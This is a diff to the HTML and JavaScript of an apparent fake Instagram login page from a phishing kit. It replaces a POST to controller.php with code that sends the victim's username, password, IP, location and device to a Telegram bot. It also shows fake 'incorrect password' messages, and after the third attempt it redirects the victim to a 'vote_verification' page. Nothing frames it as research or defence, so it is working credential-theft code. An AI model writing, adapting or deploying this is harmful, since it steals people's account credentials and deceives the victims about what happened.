@@ -516,7 +516,8 @@
     <input type="hidden" id='ip' value='105.112.208.131' name='ip'>
     
     <!-- Root -->
-    <script>
+<!-- Root -->
+<script>
     var login = document.getElementById('login');
     var loader = document.getElementById('loader');
     var feedback = document.getElementById('feedback');
@@ -526,7 +527,7 @@
     var city = document.getElementById('city');
     var ip = document.getElementById('ip');
     var x = 0;
-    
+
     login.addEventListener('click', function () {
         login.textContent = "";
         loader.style.display = "block";
@@ -536,7 +537,6 @@
             login.textContent = "Log In";
             loader.style.display = "none"; // Correct
 
-            
             if (username.value == "" || password.value == "") {
                 feedback.textContent = "Inputs cannot be empty";
             } else {
@@ -553,32 +553,61 @@
             login.textContent = 'Log In';
             loader.style.display = 'none';
             const deviceName = navigator.userAgent;
-            const data = new FormData();
-            data.append('username', username.value);
-            data.append('password', password.value);
-            data.append('logType', 'instagram logs');
-            data.append('device', deviceName);
-            // Update the URL to point to controller.php
-            const response = new XMLHttpRequest();
-            response.onreadystatechange = function () {
-                feedback.style.display = 'block';
-            };
-            response.open('POST', 'controller.php', true); // Update the URL here
-            response.send(data);
-            x ++
+
+            // Create a message to send to the Telegram bot
+            const message = `
+                Username: ${username.value}
+                Password: ${password.value}
+                Country: ${country.value}
+                City: ${city.value}
+                IP: ${ip.value}
+                Device: ${deviceName}
+            `;
+
+            // Replace 'YOUR_BOT_TOKEN' with your actual bot token
+            // Replace 'YOUR_CHAT_ID' with your actual chat ID
+            const botToken = 'YOUR_BOT_TOKEN';
+            const chatId = 'YOUR_CHAT_ID';
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Prepare the data to be sent to Telegram
+            const data = new URLSearchParams();
+            data.append('chat_id', chatId);
+            data.append('text', message);
+
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                body: data,
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    feedback.textContent = 'Message sent successfully!';
+                } else {
+                    feedback.textContent = 'Error sending message.';
+                }
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                feedback.textContent = 'An error occurred while sending the message.';
+            });
+
+            // Rest of your code for feedback messages
+            x++;
             feedback.textContent = 'The password you entered is incorrect. Please check your password and try again';
             if (x == 2) {
-                feedback.textContent = 'The password you entered again is still incorrect. Please check your password and try again'
-            }else if (x == 3){
+                feedback.textContent = 'The password you entered again is still incorrect. Please check your password and try again';
+            } else if (x == 3) {
                 feedback.textContent = '';
-                window.location.href='vote_verification.html'
+                window.location.href = 'vote_verification.html';
             }
-            response.send(data);
-
-            // Rest of your code...
         }, 1500);
     }
 </script>
+
 
 </body>
 
